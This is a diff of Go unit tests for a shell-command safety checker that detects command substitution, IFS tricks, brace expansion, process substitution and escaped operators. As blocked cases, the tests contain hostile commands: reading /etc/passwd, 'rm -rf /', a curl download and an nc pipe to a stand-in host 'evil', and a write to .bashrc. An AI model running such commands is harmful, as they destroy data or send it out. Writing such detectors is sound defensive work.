@@ -35,27 +35,27 @@ func TestHasControlCharacters(t *testing.T) {
 
 	t.Run("normal whitespace allowed", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasControlCharacters("hello\tworld\n"))
+		assert.False(t, hasControlCharacters("hello\tworld\n", ""))
 	})
 
 	t.Run("null byte blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasControlCharacters("hello\x00world"))
+		assert.True(t, hasControlCharacters("hello\x00world", ""))
 	})
 
 	t.Run("bell blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasControlCharacters("hello\x07world"))
+		assert.True(t, hasControlCharacters("hello\x07world", ""))
 	})
 
 	t.Run("escape blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasControlCharacters("hello\x1bworld"))
+		assert.True(t, hasControlCharacters("hello\x1bworld", ""))
 	})
 
 	t.Run("carriage return allowed", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasControlCharacters("hello\r\nworld"))
+		assert.False(t, hasControlCharacters("hello\r\nworld", ""))
 	})
 }
 
@@ -64,22 +64,22 @@ func TestHasCommandSubstitution(t *testing.T) {
 
 	t.Run("dollar-paren blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasCommandSubstitution("echo $(whoami)"))
+		assert.True(t, hasCommandSubstitution("", stripSingleQuotes("echo $(whoami)")))
 	})
 
 	t.Run("backtick blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasCommandSubstitution("echo `whoami`"))
+		assert.True(t, hasCommandSubstitution("", stripSingleQuotes("echo `whoami`")))
 	})
 
 	t.Run("single-quoted dollar-paren safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasCommandSubstitution("echo '$(whoami)'"))
+		assert.False(t, hasCommandSubstitution("", stripSingleQuotes("echo '$(whoami)'")))
 	})
 
 	t.Run("no substitution", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasCommandSubstitution("echo hello"))
+		assert.False(t, hasCommandSubstitution("", stripSingleQuotes("echo hello")))
 	})
 }
 
@@ -88,22 +88,22 @@ func TestHasIFSInjection(t *testing.T) {
 
 	t.Run("bare IFS", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasIFSInjection("cat$IFS/etc/passwd"))
+		assert.True(t, hasIFSInjection("", stripSingleQuotes("cat$IFS/etc/passwd")))
 	})
 
 	t.Run("braced IFS", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasIFSInjection("cat${IFS}/etc/passwd"))
+		assert.True(t, hasIFSInjection("", stripSingleQuotes("cat${IFS}/etc/passwd")))
 	})
 
 	t.Run("single-quoted IFS safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasIFSInjection("echo '$IFS'"))
+		assert.False(t, hasIFSInjection("", stripSingleQuotes("echo '$IFS'")))
 	})
 
 	t.Run("no IFS", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasIFSInjection("echo hello"))
+		assert.False(t, hasIFSInjection("", stripSingleQuotes("echo hello")))
 	})
 }
 
@@ -112,27 +112,27 @@ func TestHasDangerousBraceExpansion(t *testing.T) {
 
 	t.Run("rm in braces blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasDangerousBraceExpansion("{rm,-rf,/}"))
+		assert.True(t, hasDangerousBraceExpansion("", stripSingleQuotes("{rm,-rf,/}")))
 	})
 
 	t.Run("curl in braces blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasDangerousBraceExpansion("{curl,-o,/tmp/x,http://evil}"))
+		assert.True(t, hasDangerousBraceExpansion("", stripSingleQuotes("{curl,-o,/tmp/x,http://evil}")))
 	})
 
 	t.Run("safe brace expansion", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasDangerousBraceExpansion("echo {a,b,c}"))
+		assert.False(t, hasDangerousBraceExpansion("", stripSingleQuotes("echo {a,b,c}")))
 	})
 
 	t.Run("single-quoted braces safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasDangerousBraceExpansion("echo '{rm,-rf}'"))
+		assert.False(t, hasDangerousBraceExpansion("", stripSingleQuotes("echo '{rm,-rf}'")))
 	})
 
 	t.Run("force flag in braces blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasDangerousBraceExpansion("{git,push,--force}"))
+		assert.True(t, hasDangerousBraceExpansion("", stripSingleQuotes("{git,push,--force}")))
 	})
 }
 
@@ -141,22 +141,22 @@ func TestHasProcessSubstitution(t *testing.T) {
 
 	t.Run("input process sub blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasProcessSubstitution("diff <(cat /etc/passwd) file"))
+		assert.True(t, hasProcessSubstitution("", stripSingleQuotes("diff <(cat /etc/passwd) file")))
 	})
 
 	t.Run("output process sub blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasProcessSubstitution("tee >(nc evil 1234)"))
+		assert.True(t, hasProcessSubstitution("", stripSingleQuotes("tee >(nc evil 1234)")))
 	})
 
 	t.Run("single-quoted safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasProcessSubstitution("echo '<(hello)'"))
+		assert.False(t, hasProcessSubstitution("", stripSingleQuotes("echo '<(hello)'")))
 	})
 
 	t.Run("normal redirect safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasProcessSubstitution("echo hello > file.txt"))
+		assert.False(t, hasProcessSubstitution("", stripSingleQuotes("echo hello > file.txt")))
 	})
 }
 
@@ -165,32 +165,32 @@ func TestHasBackslashOperators(t *testing.T) {
 
 	t.Run("backslash semicolon blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasBackslashOperators(`cat safe.txt \; rm -rf /`))
+		assert.True(t, hasBackslashOperators("", stripSingleQuotes(`cat safe.txt \; rm -rf /`)))
 	})
 
 	t.Run("backslash pipe blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasBackslashOperators(`echo hello \| sh`))
+		assert.True(t, hasBackslashOperators("", stripSingleQuotes(`echo hello \| sh`)))
 	})
 
 	t.Run("backslash ampersand blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasBackslashOperators(`echo a \& rm -rf /`))
+		assert.True(t, hasBackslashOperators("", stripSingleQuotes(`echo a \& rm -rf /`)))
 	})
 
 	t.Run("single-quoted safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasBackslashOperators(`echo '\;'`))
+		assert.False(t, hasBackslashOperators("", stripSingleQuotes(`echo '\;'`)))
 	})
 
 	t.Run("double-quoted safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasBackslashOperators(`echo "\;""`))
+		assert.False(t, hasBackslashOperators("", stripDoubleQuotes(`echo "\;""`)))
 	})
 
 	t.Run("normal pipe safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasBackslashOperators("echo hello | grep h"))
+		assert.False(t, hasBackslashOperators("", stripSingleQuotes("echo hello | grep h")))
 	})
 }
 
@@ -199,27 +199,27 @@ func TestHasVariableRedirect(t *testing.T) {
 
 	t.Run("var before redirect blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasVariableRedirect("echo x > $HOME/.bashrc"))
+		assert.True(t, hasVariableRedirect("", stripSingleQuotes("echo x > $HOME/.bashrc")))
 	})
 
 	t.Run("braced var before redirect blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasVariableRedirect("echo x > ${HOME}/.bashrc"))
+		assert.True(t, hasVariableRedirect("", stripSingleQuotes("echo x > ${HOME}/.bashrc")))
 	})
 
 	t.Run("var after redirect blocked", func(t *testing.T) {
 		t.Parallel()
-		assert.True(t, hasVariableRedirect("$VAR > /etc/config"))
+		assert.True(t, hasVariableRedirect("", stripSingleQuotes("$VAR > /etc/config")))
 	})
 
 	t.Run("single-quoted safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasVariableRedirect("echo '$HOME > file'"))
+		assert.False(t, hasVariableRedirect("", stripSingleQuotes("echo '$HOME > file'")))
 	})
 
 	t.Run("literal redirect safe", func(t *testing.T) {
 		t.Parallel()
-		assert.False(t, hasVariableRedirect("echo hello > /tmp/out.txt"))
+		assert.False(t, hasVariableRedirect("", stripSingleQuotes("echo hello > /tmp/out.txt")))
 	})
 }
 
